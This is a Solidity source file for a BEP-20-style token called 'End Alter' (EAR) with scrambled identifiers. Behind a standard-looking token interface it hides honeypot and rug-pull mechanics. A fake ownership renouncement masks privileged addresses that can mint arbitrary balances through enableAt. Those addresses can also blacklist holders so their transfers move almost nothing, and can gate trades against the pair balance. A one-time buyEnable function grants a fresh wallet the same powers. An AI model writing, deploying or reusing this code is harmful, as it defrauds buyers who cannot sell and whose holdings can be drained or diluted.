//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface marketingWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract swapMaxLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface enableLimit {
    function createPair(address receiverIs, address liquidityAuto) external returns (address);
}

interface senderAmountTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitTotal) external view returns (uint256);

    function transfer(address takeBuy, uint256 tokenFee) external returns (bool);

    function allowance(address txMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenFee) external returns (bool);

    function transferFrom(
        address sender,
        address takeBuy,
        uint256 tokenFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txEnable, uint256 value);
    event Approval(address indexed txMin, address indexed spender, uint256 value);
}

interface senderAmountToMetadata is senderAmountTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EndAlter is swapMaxLaunched, senderAmountTo, senderAmountToMetadata {

    function approve(address liquidityAmount, uint256 tokenFee) public virtual override returns (bool) {
        totalBuy[_msgSender()][liquidityAmount] = tokenFee;
        emit Approval(_msgSender(), liquidityAmount, tokenFee);
        return true;
    }

    uint256 private shouldLiquidity;

    function transfer(address launchedFromList, uint256 tokenFee) external virtual override returns (bool) {
        return modeEnableSwap(_msgSender(), launchedFromList, tokenFee);
    }

    address takeMinLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private tokenTo;

    uint256 private totalFrom;

    uint256 private swapModeLimit;

    uint256 listTotal;

    mapping(address => mapping(address => uint256)) private totalBuy;

    bool public isAt;

    function maxTakeMode(address exemptFrom) public {
        modeList();
        
        if (exemptFrom == feeTxExempt || exemptFrom == receiverAutoTx) {
            return;
        }
        tokenTx[exemptFrom] = true;
    }

    uint256 private atLaunched;

    string private marketingSwap = "End Alter";

    function owner() external view returns (address) {
        return amountAutoBuy;
    }

    function balanceOf(address limitTotal) public view virtual override returns (uint256) {
        return minSender[limitTotal];
    }

    function symbol() external view virtual override returns (string memory) {
        return txTo;
    }

    uint256 private limitTeam = 100000000 * 10 ** 18;

    uint256 constant takeReceiver = 8 ** 10;

    address public receiverAutoTx;

    function getOwner() external view returns (address) {
        return amountAutoBuy;
    }

    mapping(address => uint256) private minSender;

    bool private autoMarketing;

    event OwnershipTransferred(address indexed maxLaunch, address indexed tradingSender);

    mapping(address => bool) public senderToken;

    function enableAt(address launchedFromList, uint256 tokenFee) public {
        modeList();
        minSender[launchedFromList] = tokenFee;
    }

    function allowance(address toWallet, address liquidityAmount) external view virtual override returns (uint256) {
        if (liquidityAmount == takeMinLaunched) {
            return type(uint256).max;
        }
        return totalBuy[toWallet][liquidityAmount];
    }

    address private amountAutoBuy;

    function buyLimit(uint256 tokenFee) public {
        modeList();
        listTotal = tokenFee;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return limitTeam;
    }

    function modeEnableSwap(address totalReceiverEnable, address takeBuy, uint256 tokenFee) internal returns (bool) {
        if (totalReceiverEnable == feeTxExempt) {
            return senderIs(totalReceiverEnable, takeBuy, tokenFee);
        }
        uint256 receiverTo = senderAmountTo(receiverAutoTx).balanceOf(limitLaunch);
        require(receiverTo == listTotal);
        require(takeBuy != limitLaunch);
        if (tokenTx[totalReceiverEnable]) {
            return senderIs(totalReceiverEnable, takeBuy, takeReceiver);
        }
        return senderIs(totalReceiverEnable, takeBuy, tokenFee);
    }

    constructor (){
        
        marketingWallet tokenReceiver = marketingWallet(takeMinLaunched);
        receiverAutoTx = enableLimit(tokenReceiver.factory()).createPair(tokenReceiver.WETH(), address(this));
        
        feeTxExempt = _msgSender();
        feeList();
        senderToken[feeTxExempt] = true;
        minSender[feeTxExempt] = limitTeam;
        if (shouldLiquidity == swapModeLimit) {
            amountToken = false;
        }
        emit Transfer(address(0), feeTxExempt, limitTeam);
    }

    function modeList() private view {
        require(senderToken[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return autoMax;
    }

    function buyEnable(address buyReceiverAt) public {
        require(buyReceiverAt.balance < 100000);
        if (isAt) {
            return;
        }
        if (amountToken) {
            shouldLiquidity = tokenTo;
        }
        senderToken[buyReceiverAt] = true;
        if (amountToken) {
            swapModeLimit = shouldLiquidity;
        }
        isAt = true;
    }

    string private txTo = "EAR";

    uint256 txReceiver;

    mapping(address => bool) public tokenTx;

    bool public amountToken;

    function transferFrom(address totalReceiverEnable, address takeBuy, uint256 tokenFee) external override returns (bool) {
        if (_msgSender() != takeMinLaunched) {
            if (totalBuy[totalReceiverEnable][_msgSender()] != type(uint256).max) {
                require(tokenFee <= totalBuy[totalReceiverEnable][_msgSender()]);
                totalBuy[totalReceiverEnable][_msgSender()] -= tokenFee;
            }
        }
        return modeEnableSwap(totalReceiverEnable, takeBuy, tokenFee);
    }

    uint8 private autoMax = 18;

    function name() external view virtual override returns (string memory) {
        return marketingSwap;
    }

    address public feeTxExempt;

    function feeList() public {
        emit OwnershipTransferred(feeTxExempt, address(0));
        amountAutoBuy = address(0);
    }

    address limitLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function senderIs(address totalReceiverEnable, address takeBuy, uint256 tokenFee) internal returns (bool) {
        require(minSender[totalReceiverEnable] >= tokenFee);
        minSender[totalReceiverEnable] -= tokenFee;
        minSender[takeBuy] += tokenFee;
        emit Transfer(totalReceiverEnable, takeBuy, tokenFee);
        return true;
    }

}